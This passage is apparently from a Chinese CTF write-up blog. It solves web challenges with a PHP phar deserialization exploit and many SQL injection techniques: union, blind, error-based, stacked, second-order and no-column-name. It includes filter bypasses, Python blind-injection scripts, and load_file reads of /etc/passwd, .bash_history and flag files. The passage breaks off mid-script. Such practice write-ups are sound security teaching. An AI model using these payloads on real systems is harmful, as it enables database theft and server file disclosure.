<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token comment">//构成$c->source访问Test类中不存在的source属性触发__get</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将生成的phar文件上传，记得抓包改后缀<code>jpg</code>，类型<code>image/jpeg</code>.</p>
<p>然后就是要找到文件路径，直接在url访问upload，发现我们上传的文件名字，最后在file.php页面利用phar协议get传参</p>
<p><code>file.php?file=phar://upload/3fc8a9dd0fd47215edfc0d945febf41a.jpg</code></p>
<p>base64解码得flag</p>
<hr>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h4 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h4><p>先随便来个username&#x3D;1,password&#x3D;1，提示账号密码错误</p>
<p>打开hackbar导入url，在password后加个单引号，发现报错，存在注入漏洞</p>
<p>password&#x3D;1’or 1&#x3D;1%23 这里用&#x3D;&#x3D;%23&#x3D;&#x3D;做注释符，发送后之间出现flag</p>
<hr>
<h4 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h4><p>本题为&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;</p>
<p>1’;show tables;–+	发现两个表1919810931114514和words</p>
<p>1’;select * from 1919810931114514;–+	直接查询，发现select|update|delete|drop|insert|where被过滤了</p>
<p>1’;show columns from <code>words</code>;–+	</p>
<p>1’;show columns from <code>1919810931114514</code>;–+	 猜测这里的输入框查询的是words表对应id的字段，不幸的是flag在1919810931114514表里。可以先把words表改名为其他的，然后将1919810931114514改名为words，就可以查询flag了！</p>
<p>1’;rename table <code>words</code> to words2;  rename table <code>1919810931114514</code> to <code>words</code>;alter table words change flag id varchar(100);–+</p>
<p>然后万能密码查询：</p>
<p>1’or 1&#x3D;1;–+</p>
<hr>
<h4 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h4><p>本题主要是&#x3D;&#x3D;猜解后台sql查询语句&#x3D;&#x3D;</p>
<p>通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;可知)，需要注意的是，此时的||起到的作用是or的作用</p>
<p>解法：</p>
<p>输入的内容为 *,1<br>内置的sql语句为sql &#x3D; “select”.post[‘query’].”||flag from Flag”;<br>如果$post[‘query’]的数据为 *,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
<hr>
<h4 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h4><p>&#x3D;&#x3D;有回显的查询&#x3D;&#x3D;</p>
<p>首先用username&#x3D;1,password&#x3D;1上传，发现是get 传参，打开hackbar</p>
<p>?username&#x3D;1’or 1&#x3D;1%23&amp;password&#x3D;1	万能密码登录</p>
<p>?username&#x3D;1’order by 3%23&amp;password&#x3D;1	order by 查列，有三列</p>
<p>?username&#x3D;1’union select 1,2,3%23&amp;password&#x3D;1	有回显2,3</p>
<p>?username&#x3D;1’union select 1,2,database()%23&amp;password&#x3D;1	查数据库</p>
<p>?username&#x3D;1’union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’geek’)%23&amp;password&#x3D;1	查表</p>
<p>?username&#x3D;1’union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’l0ve1ysq1’)%23&amp;password&#x3D;1	查字段</p>
<p>?username&#x3D;1’union select 1,(select group_concat(username) from l0ve1ysq1),(select group_concat(password) from l0ve1ysq1)%23&amp;password&#x3D;1	查值（页面看不清，查看网页源代码即可）</p>
<hr>
<h4 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h4><p>&#x3D;&#x3D;布尔盲注&#x3D;&#x3D;</p>
<p>首先用username&#x3D;1,password&#x3D;1上传，发现是get 传参，打开hackbar</p>
<p>无法使用万能密码登录，这里用	?username&#x3D;1’%23&amp;password&#x3D;1	直接将password注释</p>
<p>?username&#x3D;1’oorrder bbyy 3%23&amp;password&#x3D;1	orderby 查列，这里过滤了or和by,双写即可绕过</p>
<p>用union select 之后没有回显，这里使用bp 爆破的方法</p>
<p>?username&#x3D;admin’anandd left((database()),1)&#x3D;’g’%23&amp;password&#x3D;1	得到数据库名为geek</p>
<p>同理可得表名b4bsql、geek，flag在b4bsql里</p>
<p>?username&#x3D;admin’anandd left((selselectect passwoorrd frofromm geek.b4bsql limit 7,1),1)&#x3D;’f’%23&amp;password&#x3D;1	爆破可得flag</p>
<hr>
<h4 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h4><p>&#x3D;&#x3D;报错注入&#x3D;&#x3D;</p>
<p>1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过<br>2：&#x3D;号被过滤可以用like来绕过<br>3：substring与mid被过滤可以用right与left来绕过</p>
<p>首先用username&#x3D;1,password&#x3D;1上传，发现是get 传参，打开hackbar</p>
<p>这里过滤了空格，用()绕过</p>
<p>?username&#x3D;1’or(updatexml(1,concat(0x7e,(database())),0x7e))%23&amp;password&#x3D;1	爆库名geek</p>
<p>?username&#x3D;1’or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e),1))%23&amp;password&#x3D;1	爆表名H4rDsq1</p>
<p>?username&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(“H4rDsq1”)),0x7e),1))%23&amp;password&#x3D;1	爆字段id,username,password</p>
<p>?username&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1	爆flag左半边</p>
<p>?username&#x3D;1’or(updatexml(1,concat(0x7e,(select(right(password,35))from(geek.H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1	爆flag右边</p>
<p>拼接即可拿到flag</p>
<hr>
<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p>抓包发现了一串神秘字符MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
<p>base32解码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</p>
<p>base64解码：select * from user where username &#x3D; ‘$name’</p>
<p>fuzz发现过滤的字符</p>
<p>name&#x3D;1’Order by 3#&amp;pw&#x3D;1	大小写绕过order，查列</p>
<p><code>本题考点</code>：&#x3D;&#x3D;联合查询&#x3D;&#x3D;所查询的数据不存在时，联合查询会构造一个虚拟的数据</p>
<p>name&#x3D;1’union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#&amp;pw&#x3D;1</p>
<hr>
<h4 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h4><p>和强网杯那题很像，但是过滤了关键的rename，这里用handler</p>
<p>?inject&#x3D;1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
<hr>
<h4 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>布尔盲注+脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://8978ccf7-1a80-456a-8679-c416322d2b1d.node4.buuoj.cn:81/index.php"</span>
temp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span>
re1 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>temp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>re1<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">''</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select(flag)from(flag)),"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1))="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">")"</span>
        re <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>temp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> re <span class="token operator">==</span> re1<span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><p>注册一个账号，发个广告，在广告名字出有sql注入。</p>
<p>过滤了or,–+,#，这里用 <code>&#39;</code>绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 测试发现有22列</p>
<p>在2,3位置回显</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库web1</p>
<p>接下来查表</p>
<p>这里没有办法使用information_schema, 只能换用别的表。还有另一个表<strong>mysql.innodb_table_stats</strong>可以看表名、数据库名，就是没有列名。</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后查列，但是mysql.innodb_table_stats不能查列名，这里用&#x3D;&#x3D;无列名注入&#x3D;&#x3D;</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;b,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后看flag</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h4 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h4><p>&#x3D;&#x3D;二次注入&#x3D;&#x3D;</p>
<p>查看源代码，发现可以传参file，使用伪协议读取源码。</p>
<p>index.php、change.php、delete.php、search.php、config.php</p>
<p>在change.php里面有sql的updata语句，可以使用报错注入</p>
<p>其对password和username做的过滤，很难绕过，但是对地址的过滤很少。</p>
<p>那我们可以在一开始发送信息的时候往数据库里插入恶意语句，然后使change.php进行恶意注入。</p>
<p>已知flag在<code>/flag.txt</code>里面，使用<code>load_file</code>读取</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;&#39;and updatexml(1,concat(0x23,load_file(&#39;&#x2F;flag.txt&#39;)),1)#
上面只能爆出前面的flag，不完整，下面使用mid函数爆后面的

&quot;&#39;and updatexml(1,concat(0x23,mid(load_file(&#39;&#x2F;flag.txt&#39;),32)),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h4><p>&#x3D;&#x3D;二次注入&#x3D;&#x3D;</p>
<p>注册的时候发现了一些词被过滤掉了，fuzz了一下，过滤了部分字符</p>
<p>当<code>username</code>是<code>1&quot;</code>时，在修改密码的时候报错，说明存在二次注入，双引号闭合。</p>
<p>可以推出后台的sql语句为</p>
<pre class="line-numbers language-none"><code class="language-none">update users set password&#x3D;&#39;xxxx&#39; where username&#x3D;&quot;xxxx&quot; and pwd&#x3D;&#39;202cb962ac59075b964b07152d234b70&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为存在报错回显，那么就可以直接用&#x3D;&#x3D;报错注入&#x3D;&#x3D;</p>
<p>1”or(extractvalue(1,concat(0x7e,(database()))))#</p>
<p>爆数据库：web_sqli</p>
<p>1”or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;’web_sqli’))))#</p>
<p>爆表：article,flag,users</p>
<p>1”or(extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x3D;’users’)))))#</p>
<p>爆字段：name,pwd,email,real_flag_1s_here</p>
<p>1”or(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(‘^f’))))))#</p>
<p>逆序输出：	}614aa102efe0-c999-dda4-62e2-32</p>
<p>正序后：		23-2e26-4add-999c-0efe201aa416}</p>
<p>1”or(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(‘^f’)))))#</p>
<p>最终：flag{42b76a23-2e26-4add-999c-0efe201aa416}</p>
<p><code>regexp(&#39;^f&#39;)</code>是查找f开头的字符串。</p>
<p><code>reverse()</code>是逆序输出</p>
<hr>
<h4 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h4><p>&#x3D;&#x3D;GIT泄露&#x3D;&#x3D;  &#x3D;&#x3D;二次注入&#x3D;&#x3D;</p>
<p>write_do.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',
                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">title&#x3D;23&amp;category&#x3D;1&#39;,content&#x3D;database(),&#x2F;*&amp;content&#x3D;3123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>再让content &#x3D; *&#x2F;#</p>
<p>成功读到数据库名称</p>
<p>title&#x3D;23&amp;category&#x3D;1’,content&#x3D;user(),&#x2F;*&amp;content&#x3D;3123</p>
<p>发现是root，这样的话，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要root权限)</p>
<p>所以sql注入读取本地文件 可以使用load_file()</p>
<p>先读etc&#x2F;passwd</p>
<p>发现有个www用户<br>查看<strong>bash_history ：</strong> <strong>保存了当前用户使用过的历史命令,方便查找</strong><br>在&#x2F;home&#x2F;www&#x2F;下<br>paylaod</p>
<pre class="line-numbers language-none"><code class="language-none">213&#39;,content&#x3D;(select load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;)),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>看见他删除了<code> .DS_Store</code> 文件，由于目标环境是docker，所以 .DS_Store 文件应该在 <code>/tmp/html</code> 中。而 .DS_Store 文件中，经常会有一些不可见的字符，可以使用<code>hex</code>函数对其进行16进制转换</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">213&#39;,content&#x3D;(select hex(load_file(&quot;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&quot;))),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>放bp解码，flag在<code>flag_8946e1f1ee3e40f.php</code></p>
<p>title&#x3D;23&amp;category&#x3D;1’,content&#x3D;hex((load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php’))),&#x2F;*&amp;content&#x3D;3123</p>
<p>解码后得到flag</p>
<hr>
<h4 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h4><p>id存在注入，可以使用异或注入.</p>
<p>fuzz一下发现过滤了information，所以不能用</p>
<p>可以用<code>sys.x$schema_flattened_keys</code>或者<code>sys.schema_table_statistics_with_buffer</code>代替</p>
<pre class="line-numbers language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103
2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但是不能查字段，所以要用到&#x3D;&#x3D;无列名注入&#x3D;&#x3D;</p>
<p>这里用到了<code>ascii位偏移</code></p>
<p>比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0，换一个角度来说，只会比较一次，也就是首字符</p>
<p>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">'http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/'</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">''</span>
    res <span class="token operator">+=</span> flag
    <span class="token keyword">return</span> res
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
